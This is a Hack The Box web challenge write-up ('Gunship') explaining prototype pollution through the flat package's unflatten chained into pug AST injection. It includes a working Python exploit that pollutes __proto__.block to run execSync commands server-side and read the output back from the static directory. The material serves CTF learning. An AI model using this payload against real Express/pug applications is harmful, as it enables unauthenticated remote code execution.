---
layout: post
title: "Gunship (HTB web)"
subtitle: "prototype pollution through the flat package into a pug ast injection"
date: 2023-04-16
tags: [htb, ctf, web, prototype-pollution, ssti]
category: writeups
kind: challenge
tldr: "An Express app ran unflatten() from the flat package on the raw request body, which let me set __proto__ keys. The same handler called pug.compile(), and pug walks the prototype chain when it builds its AST. I polluted __proto__.block with a fake Text node whose line was a JS expression, and pug executed it as code."
---

## the challenge

The app was a small Node/Express service. The source came with the challenge, so this was a whitebox code review. `index.js` is the bootstrap:

```js
const express = require('express');
const app     = express();
const routes  = require('./routes');
const path    = require('path');

app.use(express.json());
app.set('views', './views');
app.use('/static', express.static(path.resolve('static')));
app.use(routes);

app.listen(1337, () => console.log('Listening on port 1337'));
```

Two facts to note up front: `express.json()` parses the body into a plain object I fully control, and `/static` serves files off disk from the `static` directory. That second one becomes the exfil channel later.

The dependency versions in `package.json` are the whole game:

```json
"dependencies": {
    "express": "^4.17.1",
    "flat": "5.0.0",
    "pug": "3.0.2"
}
```

`flat` is pinned to `5.0.0` and `pug` resolves to the `3.0.x` line. Both have known issues that chain together. The only interesting route is `/api/submit` in `routes/index.js`:

```js
const pug           = require('pug');
const { unflatten } = require('flat');
const router        = express.Router();

router.post('/api/submit', (req, res) => {
    const { artist } = unflatten(req.body);

    if (artist.name.includes('Haigh') || artist.name.includes('Westaway') || artist.name.includes('Gingell')) {
        return res.json({
            'response': pug.compile('span Hello #{user}, thank you for letting us know!')({ user: 'guest' })
        });
    } else {
        return res.json({
            'response': 'Please provide us with the full name of an existing member.'
        });
    }
});
```

The handler runs `unflatten` on my body, checks `artist.name` against three band-member names, and on a match calls `pug.compile()` on a fixed template string. Nothing about the template is user-controlled, so at a glance there is no SSTI. The bug is more indirect.

## the bug

Two flaws line up into one chain.

First, prototype pollution through `flat@5.0.0`. `unflatten` turns dotted keys back into nested objects: `{"a.b": 1}` becomes `{a: {b: 1}}`. The 5.0.0 release does not filter `__proto__` while doing that walk. So a body key like `__proto__.block` is not written onto my own object, it is written onto `Object.prototype`. Every object created afterward in the process inherits that `block` property through the prototype chain. That is prototype pollution straight from the request body, no auth, single request.

Second, `pug@3.0.x` and how its compiler reads AST nodes. When `pug.compile()` parses a template it builds an Abstract Syntax Tree, then a code generator walks that tree and emits the source of a JavaScript function, which it then evaluates. The generator reads node properties with plain member access. Plain member access resolves missing own-properties up the prototype chain. So if `Object.prototype.block` exists, pug's tree walk finds it as if it were a real child block on a node that has none.

The sink is in pug's code generator. When it processes a block it iterates the child nodes, and for each one it writes a debug-line marker into the generated function source, roughly:

```js
// inside pug's compiled-function source generation
this.buf.push("pug_debug_line = " + node.line + ";");
```

`node.line` is meant to be an integer (the source line number) so it is concatenated unquoted. If I can make `node.line` a string of my choosing, that string is spliced verbatim into the body of the function pug is about to build and run. A polluted `Object.prototype.block` supplies exactly that node. I set its `type` to `Text` so the generator treats it as a leaf it will emit, and I set its `line` to the JavaScript I want executed. This is the AST injection technique from the prototype-pollution-to-pug research (the writeup that lived at blog.p6.is/AST-Injection).

To reach the `pug.compile()` call at all I still have to clear the name gate, so `artist.name` has to contain one of `Haigh`, `Westaway`, or `Gingell`. Two keys in one body satisfy both halves: one sets the legitimate `artist.name`, the other pollutes `__proto__.block`.

## the solve

I sent both keys in a single JSON body. `artist.name` is `Gingell` to pass the `includes()` check, and `__proto__.block` is a fake pug node of type `Text` whose `line` field is the code to run. The payload writes command output to a file under the served `static` directory, then I fetch it back:

```python
import requests

ENDPOINT = 'http://TARGET/api/submit'
OUTPUT   = 'http://TARGET/static/out'

requests.post(ENDPOINT, json={
    "artist.name": "Gingell",
    "__proto__.block": {
        "type": "Text",
        "line": "process.mainModule.require('child_process').execSync('ls > /app/static/out')"
    }
})

print(requests.get(OUTPUT).text)
```

The flow at runtime: `unflatten` pollutes `Object.prototype.block` with my fake node. The handler then calls `pug.compile('span Hello #{user} ...')`. While generating the compiled function, pug's tree walk picks up the inherited `block`, treats my `Text` node as a child, and emits `pug_debug_line = process.mainModule.require('child_process').execSync('ls > /app/static/out');` into the function source. pug evaluates that function immediately, so `execSync` runs server-side, captures `ls`, and redirects it to `/app/static/out`. Because the app serves `static` under `/static`, fetching `/static/out` returns the command output. Swapping `ls` for a read of the flag file and re-fetching `/static/out` printed it.

A couple of practical notes. `process.mainModule.require` is used instead of a bare `require` because the generated function does not have `require` in its scope; reaching it through `process.mainModule` does. And pollution persists on `Object.prototype` for the life of the process, so the order matters only within the request: pollute, then trigger the compile.

## the flag

The flag came back as the contents of `/static/out` after I pointed the `execSync` command at the flag file on disk. One unauthenticated POST set up the pollution and the same request triggered the compile, turning a fixed, non-user-controlled template into remote code execution.
